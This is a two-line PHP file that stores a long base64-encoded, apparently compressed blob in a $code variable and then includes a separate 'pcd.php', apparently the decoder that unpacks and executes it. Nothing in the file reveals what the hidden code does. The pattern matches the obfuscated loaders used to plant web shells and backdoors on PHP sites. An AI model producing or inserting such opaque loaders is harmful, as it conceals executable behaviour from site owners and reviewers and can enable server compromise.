<?php
$code="s7EvyCjgUihOLS7OzM+LLy5JLCox0tC0houkpBaXFOVXgoQyUhNTUosUNJR88pMTS4CSVgo5+en5pSXxQCozTw9okhJQWUpmKki1vR0A";include("pcd.php");?>